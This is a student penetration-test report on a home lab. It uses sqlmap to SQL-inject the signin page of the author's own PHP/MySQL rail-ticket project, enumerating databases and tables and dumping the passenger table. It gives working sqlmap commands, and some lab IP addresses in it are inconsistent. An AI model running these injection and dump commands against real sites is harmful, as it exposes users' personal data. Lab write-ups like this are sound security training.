# SQLi-Injection-Testing-on-a-Website

**Version**: V1.0

**Author**: Md. Abu Hanif Siam

**Pen-testers**: Md. Abu Hanif Siam

**Reviewed By**: Tawsif Shahriar (TSD)

**Classification**: Public

## Version Control

| Version | Date               | Author           | Description  |
|---------|--------------------|------------------|--------------|
| V1.0    | 29th September, 2024 | Md. Abu Hanif Siam | Final Draft  |

## Table of Contents

1. **Executive Summary** 
   1.1 **Scope of Work**  
   1.2 **Project Objectives**  
   1.3 **Assumption**   
   1.4 **Timeline**  
   1.5 **Summary of Findings** 

2. **Methodology**  
   2.1 **Planning**  
   2.2 **Exploitation**  
   2.3 **Reporting**  

3. **Detail Findings & Working Procedure**  
   3.1 **Detailed System Information**  
   3.2 **Lab Setup**   
   3.3 **Performing Attack & Findings**   
   3.4 **Impact**   

4. **Reference**

## 1. Executive Summary

This document details the security assessment (external penetration testing) of a website (personal build project completed in CSE370). The purpose of the assessment was to provide a review of the security posture of the website infrastructure, as well as to identify potential weaknesses in its infrastructure. In this penetration testing, we will explore the website and try SQL Injection. It is one of the most common attacks that occur in the cyber world. We explore the website and find the vulnerability.

### 1.1 Scope of Work

This security assessment covers the remote penetration testing of an accessible server hosted on PhpMyAdmin, which is used by XAMPP for localhost. The assessment was carried out from a white-box perspective, with the supplied information being the tested server's IP addresses.

### 1.2 Project Objectives

This security assessment is carried out into two VMs, and the result of the assessment is then analyzed for vulnerabilities. Given the limited time that is provided for the assessment, the SQL injection service has been tested.

### 1.3 Assumption

While writing the report, we assume that both IP addresses are considered to be public IP addresses. NDA and rules of engagement have been signed, and based on the information gathering phase, the author of the website has been engaged.

### 1.4 Timeline

The timeline of the test is as below:

| Penetration Testing | Start Date/Time | End Date/Time |
|---------------------|-----------------|---------------|
| SQL Injection       | 28/09/2024      | 29/09/2024    |

*Table 1 Penetration Testing Timeline*

### 1.5 Summary of Findings

In this penetration testing, we find the website has many vulnerable pages. As the website build on MYSQL and PHP for backend and HTML and CSS for the backend, it does not handle SQL Injection in SQL query. So using the SQL Injection, we findout the details of the database and data that available on the database that is made for this website. 


## 2. Methodology
![Penetration Testing Methodology](https://github.com/AbuHanifSiam/SQLi-Injection-Testing-on-a-Website/blob/d2980f3745beaba8900d027c0d00b147aaaf16d5/SQLi%20Pentest/Picture0.png)

### 2.1. Planning

We focus on the website and check the details of the php files that is used to build the website. By checking the php files and sql queries, it seems that there is a vulnerability which can be exploitable using SQL Injection. So we planned to create a victim and attacker machine in our home lab and test the website. 

### 2.2. Exploitation

As mention in planning, we build the home lab setup and start our exploitation and discovered the vulnerable findings.

### 2.3.	 Reporting

Based on the previous two segments, we found that the website is vulnerable and we can perform both SQL Injection and XSS. We performed the SQL injection and get that every page that take user inputs is vulnerable. The base CVSS Score of this SQL Injection is 8.8.

## 3.	Detail findings & Working Procedure

### 3.1.	 Detailed Systems Information

The list of using software and OS for this pentest are:
1.	VMWare WorkStation
2.	Windows 10 Home ISO
3.	Kali-Linux-2024.2
4.	XAMPP
5.	sqlmap (Pre build in Kali Linux)

![Windows 10 Home VM](https://github.com/AbuHanifSiam/SQLi-Injection-Testing-on-a-Website/blob/d2980f3745beaba8900d027c0d00b147aaaf16d5/SQLi%20Pentest/Picture1.png)  

*Fig: 3.1.1*

**Windows 10 Home:** We download the iso file from Microsoft and install it into our VMWare Machine. The hardware configuration for this OS:
1.	Ram: 4GB
2.	HDD: 60GB
3.	Processors: 2 core
4.	Network Adapter: NAT
5.	IP Address: 192.168.213.130

![Kali Linux VM](https://github.com/AbuHanifSiam/SQLi-Injection-Testing-on-a-Website/blob/d2980f3745beaba8900d027c0d00b147aaaf16d5/SQLi%20Pentest/Picture2.png)  

*Fig: 3.1.2*

**Kali Linux:** We download the image file from the kali linux website and then install it into the VMWare Machine. This used as attacker machine. The hardware configuration for this OS:
1.	Ram: 2GB
2.	HDD: 80.1GB 
3.	Processors: 4 core
4.	Network Adapter: NAT
5.	IP Address:192.168.213.128


## 3.2.	 Lab Setup
We install these two OS in the machine. The first thing we need to setup the network so that these two machines can talk with each other. We configure the network to NAT and VMWare by default build network communication. To check if they can communicate each, we can just ping with each others ip address. 

![Windows IP Config](https://github.com/AbuHanifSiam/SQLi-Injection-Testing-on-a-Website/blob/d2980f3745beaba8900d027c0d00b147aaaf16d5/SQLi%20Pentest/Picture3.png)

*Fig: 3.2.1*

To check it, run the “ifconfig” (fig:3.2.2) in kali linux to get the network details in kali linux and run “ipconfig” (fig:3.2.1) in the windows cmd to get all the information.

![Kali IP Config](https://github.com/AbuHanifSiam/SQLi-Injection-Testing-on-a-Website/blob/d2980f3745beaba8900d027c0d00b147aaaf16d5/SQLi%20Pentest/Picture4.png)

*Fig: 3.2.2*

After getting the IP address, run the ping command.
In Kali, run:-
```
ping 198.168.213.130
```
![Ping from Kali to Windows](https://github.com/AbuHanifSiam/SQLi-Injection-Testing-on-a-Website/blob/d2980f3745beaba8900d027c0d00b147aaaf16d5/SQLi%20Pentest/Picture5.png)

*Fig: 3.2.3*

In Windows VM:-
```
ping 198.168.213.128
```
![Ping from Windows to Kali](https://github.com/AbuHanifSiam/SQLi-Injection-Testing-on-a-Website/blob/d2980f3745beaba8900d027c0d00b147aaaf16d5/SQLi%20Pentest/Picture6.png)

*Fig: 3.2.4*

After doing ping, if they can communicate, they will ping each other and response back (fig: 3.2.3 & 3.2.4). But here, we off the firewall of the windows VM for communication. Also, we need to setup a rule in the firewall system so that they can communicate. To set the rules, the steps are:

*Allow ICMP (Ping) in Windows Firewall:*
 
Windows Firewall blocks ICMP (ping) requests by default. We can enable ping by creating a firewall rule.  

•	Open **Control Panel** on your Windows machine.  
•	Go to **System and Security -> Windows Defender Firewall -> Advanced Settings.**  
•	In the left pane, click **Inbound Rules**.  
•	In the right pane, click **New Rule**.  
•	Select **Custom** and click** Next**.  
•	In the "Rule Type" section, select **All Programs**,and then click **Next**.  
•	In the **Protocol and Ports** section, choose **ICMPv4** from the list (as ICMP is the protocol used for ping).  
•	Click **Next** and allow the connection.  
•	In the Profile section, select where you want the rule to apply: Domain, Private, or Public (choose all three if unsure).  
•	Name the rule, e.g., "Allow ICMPv4 (Ping)", and click Finish.
This should allow your Kali machine to ping the Windows machine. After that we run the website (fig: 3.2.5) on windows machine. So we install the XAMPP and run the website. Now we properly setup our lab.  

![Vulnerable Website](https://github.com/AbuHanifSiam/SQLi-Injection-Testing-on-a-Website/blob/d2980f3745beaba8900d027c0d00b147aaaf16d5/SQLi%20Pentest/Picture7.png)

*Fig: 3.2.5*

### 3.3.	 Performing Attack & Findings

At first, we need to check can we access the website from attacker machine (kali) to victim machine (windows). 
To check this, run the command in the terminal:
```
curl http://<windows_vm_ip>/yourwebsite
```
```
curl http://198.168.213.130/CSE370_Project-main/home.php
```
![Access the website from kali machine](https://github.com/AbuHanifSiam/SQLi-Injection-Testing-on-a-Website/blob/d2980f3745beaba8900d027c0d00b147aaaf16d5/SQLi%20Pentest/Picture8.png)

*Fig: 3.3.1*

After running the command, if there come html as a output (fig: 3.3.1), it means it can track the website from attacking machine. 

Now we will findout the vulnerable page in this website. We will try on those page where user need to gives input. So we will try on signin page. To doing the attack automate, we used sqlmap. 

In attack machine, run the command:
```
curl http://198.168.213.130/CSE370_Project-main/signin.php
```
![Sign in PHP page](https://github.com/AbuHanifSiam/SQLi-Injection-Testing-on-a-Website/blob/d2980f3745beaba8900d027c0d00b147aaaf16d5/SQLi%20Pentest/Picture9.png)

*Fig: 3.3.2*

By running this command (fig: 3.3.2), we get an idea which type of info we can apply for SQL Injection. As those credintials in fig mention to login page. After that run the command: 
```
sqlmap -u http://198.168.213.130/CSE370_Project-main/signin.php  --data="phone=123456&password=anything" –dbs
```                        
![Databases](https://github.com/AbuHanifSiam/SQLi-Injection-Testing-on-a-Website/blob/d2980f3745beaba8900d027c0d00b147aaaf16d5/SQLi%20Pentest/Picture10.png)

*Fig:3.3.3*

We got all the details about the database (fig:3.3.3). To get more information about the user we can search for table names and data into those tables. First to findout all the table names of a database, run:	
```
sqlmap -u http://198.168.213.130/CSE370_Project-main/signin.php --data="phone=123456&password=anything" -D railticket –tables
```
![Table Names](https://github.com/AbuHanifSiam/SQLi-Injection-Testing-on-a-Website/blob/d2980f3745beaba8900d027c0d00b147aaaf16d5/SQLi%20Pentest/Picture11.png)

*Fig: 3.3.4*

This will give all the table available in dataset “railticket” (Fig: 3.3.4). To get the data from one of those tables, run:
```
sqlmap -u http://198.168.213.130/CSE370_Project-main/signin.php --data="phone=123456&password=anything" -D railticket -T passenger –dump
```
![Details](https://github.com/AbuHanifSiam/SQLi-Injection-Testing-on-a-Website/blob/d2980f3745beaba8900d027c0d00b147aaaf16d5/SQLi%20Pentest/Picture12.png)

*Fig: 3.3.5*

This give all the information of the users (fig: 3.3.5). There personal information and other. So our SQL Injection is successful and we find vulnerability.

### 3.4.	 Impact:
The impact of this vulnerability is Critical. Anyone can perform basic SQL Injection and getting all the personal information of the user. Infact the manipulation of the data is also possible. 

## 4.	Reference
1.	https://nvd.nist.gov/vuln/detail/CVE-2019-5110
2.	https://github.com/AbuHanifSiam/CSE370_Project






